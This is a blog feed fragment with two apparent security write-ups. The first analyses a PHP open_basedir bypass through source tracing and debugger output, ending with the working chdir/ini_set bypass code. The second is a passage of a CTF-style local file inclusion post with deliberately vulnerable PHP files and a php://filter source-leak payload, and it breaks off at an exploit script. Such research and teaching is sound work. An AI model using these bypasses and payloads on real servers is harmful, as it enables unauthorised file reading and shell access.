    <updated>2019-05-01T05:43:46.831Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/images/2019-04-12-10-35-58.png" alt=""><br>有国外的大佬近日公开了一个php open_basedir bypass的poc，正好最近在看php底层，于是打算分析一下。</p><h2 id="poc测试"><a href="#poc测试" class="headerlink" title="poc测试"></a>poc测试</h2><p>首先测试一下:<br><img src="/images/2019-04-12-10-38-27.png" alt=""><br>我们用如上源码进行测试，首先设置open_basedir目录为/tmp目录，再尝试用ini_set设置open_basedir则无效果，我们对根目录进行列目录，发现无效，返回bool(false)。<br>我们再尝试一下该国外大佬的poc<br><img src="/images/2019-04-12-10-49-22.png" alt=""><br>发现可以成功列举根目录，bypass open_basedir。<br>那么为什么一系列操作后，就可以重设open_basedir了呢？我们一步一步从头探索。</p><h2 id="ini-set覆盖问题探索"><a href="#ini-set覆盖问题探索" class="headerlink" title="ini_set覆盖问题探索"></a>ini_set覆盖问题探索</h2><p>为什么连续使用ini_set不会对open_basedir进行覆盖呢？我们以如下代码为例:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/tmp'</span>);</span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/'</span>);</span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'..'</span>);</span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br></pre></td></tr></table></figure></p><p>运行后结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string(0) &quot;&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br></pre></td></tr></table></figure></p><p>默认的open_basedir值本来是空，第一次设置成/tmp后，以为设置将不会覆盖。<br>我们来探索一下原因。首先找到php函数对应的底层函数:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_get : PHP_FUNCTION(ini_get)</span><br><span class="line">ini_set : PHP_FUNCTION(ini_set)</span><br></pre></td></tr></table></figure></p><p>这里我们主要看的是ini_set的流程，ini_get作为信息输出函数，我们不太关心<br>我们先对ini_set下断点，然后再run程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b /php7.0-src/ext/standard/basic_functions.c 5350</span><br><span class="line">r c.php</span><br></pre></td></tr></table></figure></p><p>程序跑起来后，首先是3个初始值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zend_string *varname;</span><br><span class="line">zend_string *new_value;</span><br><span class="line"><span class="keyword">char</span> *old_value;</span><br></pre></td></tr></table></figure></p><p>然后进入词法分析，得到3个变量值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">"SS"</span>, &amp;varname, &amp;new_value) == FAILURE) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *varname</span><br><span class="line">$45 = &#123;</span><br><span class="line">  gc = &#123;</span><br><span class="line">    refcount = 0,</span><br><span class="line">    u = &#123;</span><br><span class="line">      v = &#123;</span><br><span class="line">        type = 6 &apos;\006&apos;,</span><br><span class="line">        flags = 2 &apos;\002&apos;,</span><br><span class="line">        gc_info = 0</span><br><span class="line">      &#125;,</span><br><span class="line">      type_info = 518</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  h = 15582417252668088432,</span><br><span class="line">  len = 12,</span><br><span class="line">  val = &quot;o&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是zend_string的结构体,也是php7的新增结构:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc; <span class="comment">/*gc信息*/</span></span><br><span class="line">    zend_ulong        h;  <span class="comment">/* hash value */</span></span><br><span class="line">    <span class="keyword">size_t</span>            len; <span class="comment">/*字符串长度*/</span></span><br><span class="line">    <span class="keyword">char</span>              val[<span class="number">1</span>]; <span class="comment">/*字符串起始地址*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>我们可以看到varname.val为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;varname.val</span><br><span class="line">$46 = (char (*)[1]) 0x7ffff7064978</span><br><span class="line">pwndbg&gt; x/s $46</span><br><span class="line">0x7ffff7064978:&quot;open_basedir&quot;</span><br></pre></td></tr></table></figure></p><p>然后new_value.val为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;new_value.val</span><br><span class="line">$48 = (char (*)[1]) 0x7ffff7058ad8</span><br><span class="line">pwndbg&gt; x/s $48</span><br><span class="line">0x7ffff7058ad8:&quot;/tmp&quot;</span><br></pre></td></tr></table></figure></p><p>即我们最开始传入的两个参数。<br>然后程序拿到原来的open_basedir的value：<br><img src="/images/2019-04-12-11-50-22.png" alt=""><br><img src="/images/2019-04-12-11-50-14.png" alt=""><br>然后会进入<code>php_ini_check_path</code><br><img src="/images/2019-04-12-11-33-24.png" alt=""><br>由于第一次没有设置过open_basedir，所以直接跳出判断，进入下一步<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (zend_alter_ini_entry_ex(varname, new_value, PHP_INI_USER, PHP_INI_STAGE_RUNTIME, <span class="number">0</span>) == FAILURE) &#123;</span><br><span class="line">zval_dtor(return_value);</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们跟进FAILURE，找到定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">  SUCCESS =  <span class="number">0</span>,</span><br><span class="line">  FAILURE = <span class="number">-1</span>,<span class="comment">/* this MUST stay a negative number, or it may affect functions! */</span></span><br><span class="line">&#125; ZEND_RESULT_CODE;</span><br></pre></td></tr></table></figure></p><p>当zend_alter_ini_entry_ex的返回值不为-1时，即代表更新成功，否则则会进入if，返回false<br>而经过比对发现:第一次设置open_basedir和第二次设置时候，正是这里的返回值不一样，第一次设置时，这里为SUCCESS，即0，而第二次设置为FAILURE，即-1，我们跟入zend_alter_ini_entry_ex进行比对：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b /php7.0-src/Zend/zend_ini.c:330</span><br></pre></td></tr></table></figure></p><p>发现两次不同的点在于如下判断：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ini_entry-&gt;on_modify</span><br><span class="line">|| ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) == SUCCESS)</span><br></pre></td></tr></table></figure></p><p>第一次时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_entry-&gt;on_modify = 0x5d046e &lt;OnUpdateBaseDir&gt;</span><br><span class="line">ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) = 0</span><br></pre></td></tr></table></figure></p><p>第二次时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_entry-&gt;on_modify ：0x5d046e &lt;OnUpdateBaseDir&gt;</span><br><span class="line">ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) = -1</span><br></pre></td></tr></table></figure></p><p>可以确定是<code>on_modify</code>，那么我们单步跟进，到达<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="title">ZEND_INI_MH</span><span class="params">(OnUpdateBaseDir)</span></span></span><br></pre></td></tr></table></figure></p><p>发现在进行如下操作时，返回FAILURE：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (php_check_open_basedir_ex(ptr, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* At least one portion of this open_basedir is less restrictive than the prior one, FAIL */</span></span><br><span class="line">efree(pathbuf);</span><br><span class="line"><span class="keyword">return</span> FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>正是<code>php_check_open_basedir_ex()</code>未通过才导致我们ini_set失败，而第一次的时候，这里是通过的。<br>所以最后的问题落在<code>php_check_open_basedir_ex</code>上，如果想要利用ini_set覆盖之前的open_basedir，那么必须通过该校验。</p><h2 id="php-check-open-basedir-ex"><a href="#php-check-open-basedir-ex" class="headerlink" title="php_check_open_basedir_ex"></a>php_check_open_basedir_ex</h2><p>找到切入点后，后面就是进行分析，看如何bypass php_check_open_basedir_ex<br>我们源码跟进这个函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(path) &gt; (MAXPATHLEN - <span class="number">1</span>)) &#123;</span><br><span class="line">php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">"File name is longer than the maximum allowed path length on this platform (%d): %s"</span>, MAXPATHLEN, path);</span><br><span class="line">errno = EINVAL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXPATHLEN      PATH_MAX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATH_MAX                 1024   <span class="comment">/* max bytes in pathname */</span></span></span><br></pre></td></tr></table></figure><p>首先判断路径是否过长，是否超过1023。<br>然后是另一个校验函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (php_check_specific_open_basedir(ptr, path) == <span class="number">0</span>) &#123;</span><br><span class="line">    efree(pathbuf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进后，该函数首先进行了操作<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(basedir, <span class="string">"."</span>) || !VCWD_GETCWD(local_open_basedir, MAXPATHLEN)) &#123;</span><br><span class="line"><span class="comment">/* Else use the unmodified path */</span></span><br><span class="line">strlcpy(local_open_basedir, basedir, <span class="keyword">sizeof</span>(local_open_basedir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>比对当前目录，并赋值给local_open_basedir，然后继续看目录名长度是否合法<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">path_len = <span class="built_in">strlen</span>(path);</span><br><span class="line"><span class="keyword">if</span> (path_len &gt; (MAXPATHLEN - <span class="number">1</span>)) &#123;</span><br><span class="line">    <span class="comment">/* empty and too long paths are invalid */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后进入操作<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expand_filepath(path, resolved_name) == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">PHPAPI <span class="keyword">char</span> *<span class="title">expand_filepath</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filepath, <span class="keyword">char</span> *real_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> expand_filepath_ex(filepath, real_path, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将传入的path，用绝对路径保存在resolved_name。<br>然后操作继续进入判断<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expand_filepath(local_open_basedir, resolved_basedir) != <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure></p><p>将local_open_basedir的值存放于resolved_basedir。用于后面的比较<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strncmp</span>(resolved_basedir, resolved_name, resolved_basedir_len) == <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (resolved_name_len &gt; resolved_basedir_len &amp;&amp; resolved_name[resolved_basedir_len - <span class="number">1</span>] != PHP_DIR_SEPARATOR) &#123;<span class="keyword">return</span> <span class="number">-1</span>;&#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* File is in the right directory */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* /openbasedir/ and /openbasedir are the same directory */</span></span><br><span class="line">    <span class="keyword">if</span> (resolved_basedir_len == (resolved_name_len + <span class="number">1</span>) &amp;&amp; resolved_basedir[resolved_basedir_len - <span class="number">1</span>] == PHP_DIR_SEPARATOR) </span><br><span class="line">    &#123;            </span><br><span class="line">        <span class="keyword">if</span> (strncasecmp(resolved_basedir, resolved_name, resolved_name_len) == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strncmp</span>(resolved_basedir, resolved_name, resolved_name_len) == <span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上述操作正是在匹配路径是否是open_basedir规定的路径。<br>那么不难发现，可控点应该就要追溯到之前的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expand_filepath()</span><br></pre></td></tr></table></figure></p><p>因为关键路径<code>resolved_name</code>和<code>resolved_basedir</code>均由这个函数生成。<br>所以要bypass php_check_open_basedir_ex的关键，在于bypass expand_filepath()。其获取到的path才是真正用来比对的path。</p><h2 id="expand-filepath"><a href="#expand-filepath" class="headerlink" title="expand_filepath()"></a>expand_filepath()</h2><p>我们跟进至：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="keyword">char</span> *<span class="title">expand_filepath</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filepath, <span class="keyword">char</span> *real_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> expand_filepath_ex(filepath, real_path, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继续跟expand_filepath_ex：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="keyword">char</span> *<span class="title">expand_filepath_ex</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filepath, <span class="keyword">char</span> *real_path, <span class="keyword">const</span> <span class="keyword">char</span> *relative_to, <span class="keyword">size_t</span> relative_to_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> expand_filepath_with_mode(filepath, real_path, relative_to, relative_to_len, CWD_FILEPATH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再跟expand_filepath_with_mode，来到关键操作位置<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (virtual_file_ex(&amp;new_state, filepath, <span class="literal">NULL</span>, realpath_mode)) &#123;</span><br><span class="line">efree(new_state.cwd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟入virtual_file_ex得到关键语句：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!IS_ABSOLUTE_PATH(path, path_length)) &#123;</span><br><span class="line"><span class="keyword">if</span> (state-&gt;cwd_length == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* resolve relative path */</span></span><br><span class="line">start = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(resolved_path , path, path_length + <span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> state_cwd_length = state-&gt;cwd_length;</span><br><span class="line">          ......</span><br><span class="line">       state-&gt;cwd_length = path_length;</span><br><span class="line">          ......</span><br><span class="line">       <span class="built_in">memcpy</span>(state-&gt;cwd, resolved_path, state-&gt;cwd_length+<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p>即目录拼接操作，如果path不是绝对路径，同时<code>state-&gt;cwd</code>长度为0，那么直接将path作为绝对路径，保存在resolved_path。否则则在state-&gt;cwd后拼接。<br>那么可以落点于path_length，这决定了我们拼接的长度<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path_length = tsrm_realpath_r(resolved_path, start, path_length, &amp;ll, &amp;t, use_realpath, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></p><p>跟进tsrm_realpath_r，不难发现主要操作用于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remove double slashes and &apos;.&apos;</span><br><span class="line">remove &apos;..&apos; and previous directory</span><br></pre></td></tr></table></figure></p><p>那么最后可以总结expand_filepath()全身心的投入在相对路径和绝对路径，没有考虑open_basedir如果为相对路径会实时变化的问题。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以最后的bypass poc也变得非常清楚：<br>首先需要构造一个相对可上跳的open_basedir<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'sky'</span>);</span><br><span class="line">chdir(<span class="string">'sky'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br></pre></td></tr></table></figure></p><p>这也是为什么要先创文件夹的原因，就是为了在当前目录构造可以<code>..</code>的ini_set<br>然后每次目录操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'..'</span>);</span><br></pre></td></tr></table></figure></p><p>都会进行一次open_basedir的比对，即php_check_open_basedir_ex。由于相对路径的问题，每次open_basedir的补全都会上跳。<br>比如初试open_basedir为/a/b/c/d<br>第一次chdir后变为/a/b/c，<br>第二次chdir后变为/a/b，<br>第三次chdir后变为/a，<br>第四次chdir后变为/，<br>那么这时候再进行ini_set，调整open_basedir为/即可通过php_check_open_basedir_ex的校验，成功覆盖，导致我们可以bypass open_basedir。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个poc还是很巧妙的，重点在于构造出相对路径的open_basedir，再触发其进行上跳！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/2019-04-12-10-35-58.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;有国外的大佬近日公开了一个php
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Some Trick About LFI</title>
    <link href="http://skysec.top/2019/04/08/Some-Trick-About-LFI/"/>
    <id>http://skysec.top/2019/04/08/Some-Trick-About-LFI/</id>
    <published>2019-04-08T05:35:30.000Z</published>
    <updated>2019-04-09T02:59:45.259Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近遇到一些文件包含的题目，在本篇文章记录两个trick~</p><h2 id="环境背景"><a href="#环境背景" class="headerlink" title="环境背景"></a>环境背景</h2><p>复现环境还是很容易搭建的：<br>例题1（php7）<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($a,<span class="string">'flag'</span>)!==<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>dir.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure></p><p>例题2（php5）<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($a,<span class="string">'flag'</span>)!==<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>phpinfo.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>两道题的最终目标都是拿到根目录的flag</p><h2 id="phpinfo-LFI"><a href="#phpinfo-LFI" class="headerlink" title="phpinfo+LFI"></a>phpinfo+LFI</h2><p>我们看到例题2：<br>我们有文件包含，那么我们可以轻易的用伪协议泄露源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>这是老生常谈的问题，无需多讲，重点在于如何去读取根目录的flag<br>最容易想到的是利用包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/index.php?file=/flag</span><br></pre></td></tr></table></figure></p><p>但是由于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos($a,<span class="string">'flag'</span>)!==<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们并不能进行读取，那么很容易想到，尝试getshell<br>这里我们可以介绍第一个trick，即利用phpinfo会打印上传缓存文件路径的特性，进行缓存文件包含达到getshell的目的。<br>我们简单写一个测试脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = 